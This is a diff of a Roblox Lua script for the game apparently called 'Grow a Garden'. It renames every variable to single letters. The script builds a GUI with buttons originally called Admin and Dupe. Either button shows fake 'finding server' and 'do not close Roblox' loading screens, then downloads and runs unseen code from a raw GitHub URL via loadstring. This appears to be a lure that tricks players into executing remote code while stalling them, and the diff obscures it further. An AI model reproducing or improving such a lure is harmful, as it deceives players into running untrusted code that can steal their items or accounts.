@@ -1,63 +1,63 @@
-local ScreenGui = Instance.new("ScreenGui")
-local LoadingFrame = Instance.new("Frame")
-local LoadingText = Instance.new("TextLabel")
-local AdminButton = Instance.new("TextButton")
-local DupeButton = Instance.new("TextButton")
+local a = Instance.new("ScreenGui")
+local b = Instance.new("Frame")
+local c = Instance.new("TextLabel")
+local d = Instance.new("TextButton")
+local e = Instance.new("TextButton")
 
 -- Properties for the ScreenGui
-ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+a.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
 
 -- Properties for the Loading Frame
-LoadingFrame.Size = UDim2.new(1, 0, 1, 0)
-LoadingFrame.Position = UDim2.new(0, 0, 0, 0)
-LoadingFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0) -- Black background
-LoadingFrame.Visible = false
-LoadingFrame.Parent = ScreenGui
+b.Size = UDim2.new(1, 0, 1, 0)
+b.Position = UDim2.new(0, 0, 0, 0)
+b.BackgroundColor3 = Color3.fromRGB(0, 0, 0) -- Black background
+b.Visible = false
+b.Parent = a
 
 -- Properties for the Loading Text
-LoadingText.Size = UDim2.new(1, 0, 0.2, 0)
-LoadingText.Position = UDim2.new(0, 0, 0.4, 0)
-LoadingText.BackgroundColor3 = Color3.fromRGB(0, 0, 0) -- Black background
-LoadingText.TextColor3 = Color3.fromRGB(255, 255, 255) -- White text
-LoadingText.TextScaled = true
-LoadingText.Parent = LoadingFrame
+c.Size = UDim2.new(1, 0, 0.2, 0)
+c.Position = UDim2.new(0, 0, 0.4, 0)
+c.BackgroundColor3 = Color3.fromRGB(0, 0, 0) -- Black background
+c.TextColor3 = Color3.fromRGB(255, 255, 255) -- White text
+c.TextScaled = true
+c.Parent = b
 
 -- Properties for the Main Frame
-local Frame = Instance.new("Frame")
-Frame.Size = UDim2.new(0.4, 0, 0.4, 0)
-Frame.Position = UDim2.new(0.3, 0, 0.3, 0)
-Frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30) -- Dark gray background
-Frame.Parent = ScreenGui
+local f = Instance.new("Frame")
+f.Size = UDim2.new(0.4, 0, 0.4, 0)
+f.Position = UDim2.new(0.3, 0, 0.3, 0)
+f.BackgroundColor3 = Color3.fromRGB(30, 30, 30) -- Dark gray background
+f.Parent = a
 
 -- Properties for the Admin Button
-AdminButton.Size = UDim2.new(0.8, 0, 0.2, 0)
-AdminButton.Position = UDim2.new(0.1, 0, 0.1, 0)
-AdminButton.BackgroundColor3 = Color3.fromRGB(50, 50, 50) -- Darker gray
-AdminButton.TextColor3 = Color3.fromRGB(255, 255, 255) -- White text
-AdminButton.TextScaled = true
-AdminButton.Parent = Frame
+d.Size = UDim2.new(0.8, 0, 0.2, 0)
+d.Position = UDim2.new(0.1, 0, 0.1, 0)
+d.BackgroundColor3 = Color3.fromRGB(50, 50, 50) -- Darker gray
+d.TextColor3 = Color3.fromRGB(255, 255, 255) -- White text
+d.TextScaled = true
+d.Parent = f
 
 -- Properties for the Dupe Button
-DupeButton.Size = UDim2.new(0.8, 0, 0.2, 0)
-DupeButton.Position = UDim2.new(0.1, 0, 0.4, 0)
-DupeButton.BackgroundColor3 = Color3.fromRGB(50, 50, 50) -- Darker gray
-DupeButton.TextColor3 = Color3.fromRGB(255, 255, 255) -- White text
-DupeButton.TextScaled = true
-DupeButton.Parent = Frame
+e.Size = UDim2.new(0.8, 0, 0.2, 0)
+e.Position = UDim2.new(0.1, 0, 0.4, 0)
+e.BackgroundColor3 = Color3.fromRGB(50, 50, 50) -- Darker gray
+e.TextColor3 = Color3.fromRGB(255, 255, 255) -- White text
+e.TextScaled = true
+e.Parent = f
 
 -- Function to show loading screen and execute loadstring
-local function showLoadingScreen(message)
-    LoadingFrame.Visible = true
-    LoadingText.Text = message
+local function g(h)
+    b.Visible = true
+    c.Text = h
     wait(2) -- Wait for 2 seconds to simulate loading
 end
 
-local function executeLoadstring()
-    showLoadingScreen("Finding a Low Server Please Wait...")
-    showLoadingScreen("Rejoining Server Please Do not Close Roblox!")
+local function i()
+    g("Finding a Low Server Please Wait...")
+    g("Rejoining Server Please Do not Close Roblox!")
     loadstring(game:HttpGet("https://raw.githubusercontent.com/lowznt/growagarden/refs/heads/main/growagarden.lua"))()
 end
 
 -- Button click events
-AdminButton.MouseButton1Click:Connect(executeLoadstring)
-DupeButton.MouseButton1Click:Connect(executeLoadstring)
+d.MouseButton1Click:Connect(i)
+e.MouseButton1Click:Connect(i)
